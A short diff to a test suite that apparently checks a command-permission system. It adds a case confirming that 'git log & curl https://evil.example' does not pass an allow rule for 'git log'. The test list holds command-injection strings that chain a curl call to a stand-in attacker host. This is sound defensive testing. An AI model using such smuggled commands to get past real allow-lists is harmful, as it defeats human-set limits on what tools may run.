@@ -323,6 +323,7 @@ describe("closed headless defaults", () => {
       "git log | tee out.txt",
       "git log > out.txt",
       "git log $(curl https://evil.example)",
+      "git log & curl https://evil.example",
       "git log `curl https://evil.example`",
       "git log\ncurl https://evil.example",
     ])("does not let %s ride on --allow 'Bash(git log*)'", (command) => {
